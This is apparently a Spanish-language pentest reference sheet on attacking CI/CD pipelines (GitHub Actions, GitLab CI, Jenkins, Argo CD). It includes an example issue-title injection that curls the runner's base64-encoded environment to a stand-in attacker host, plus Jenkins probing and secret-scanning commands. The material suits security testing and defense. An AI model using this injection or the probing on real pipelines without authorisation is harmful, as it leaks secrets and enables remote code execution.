# CI/CD Attack Surface

## GitHub Actions

Vulnerabilidades comunes:
- **Pwn Request:** workflow corre con `pull_request_target` y hace checkout del PR fork → atacante ejecuta código en runner con secrets.
- **Script injection** desde `${{ github.event.* }}` (issue title, PR body).
  ```yaml
  run: echo "${{ github.event.issue.title }}"
  # → atacante crea issue con title: "; curl atacker.cl/$(env|base64); #
  ```
- **Self-hosted runner** comprometido reusable entre jobs.
- **Secrets en logs** por `set -x`, `echo $SECRET`.
- **Permissions excesivos** (`permissions: write-all`).
- **Third-party actions sin pin** (`uses: action@main` en vez de SHA).

Audit:
```bash
# octoscan
octoscan repo target/repo

# zizmor (rust)
zizmor .github/workflows/

# Manual: buscar pull_request_target
grep -r "pull_request_target" .github/workflows/
```

## GitLab CI

- Runner shared con tags amplios → builds de varios projects en mismo runner.
- Variables protegidas mal configuradas.
- `before_script` heredado con secrets.
- DAG con job que hereda artifacts sensibles.

## Jenkins

- `/script` console accesible (Groovy → RCE).
- Pipeline approval bypass.
- Credentials en `credentials.xml`, `secrets/master.key`.
- Plugin vulnerable (Jenkins tiene historial extenso de CVEs).
- Anonymous access habilitado.

```bash
nuclei -u https://jenkins.target.cl -tags jenkins
curl https://jenkins.target.cl/script
curl https://jenkins.target.cl/asynchPeople/api/json   # users
```

## Argo CD / Flux / Tekton

- UI expuesta sin auth.
- Repo creds en ConfigMap.
- App-of-apps con repo público comprometible.

## Secrets en pipelines

```bash
trufflehog git https://github.com/target/repo --branch main
gitleaks detect --source repo/

# CI logs públicos a veces tienen secrets
curl "https://api.github.com/repos/target/repo/actions/runs" | jq '.workflow_runs[].logs_url'
```

## Supply chain

Ver `references/secrets.md` (dependency confusion, typosquatting).

## Patrón operativo

1. Si el target tiene repo público, `trufflehog` + `gitleaks` antes que nada.
2. Revisar `.github/workflows/`, `.gitlab-ci.yml`, `Jenkinsfile` por:
   - Inputs no sanitizados.
   - `pull_request_target` con checkout fork.
   - Secrets en envs con scope amplio.
3. Si tienes acceso a Jenkins/ArgoCD/etc → priv esc desde lectura → RCE.
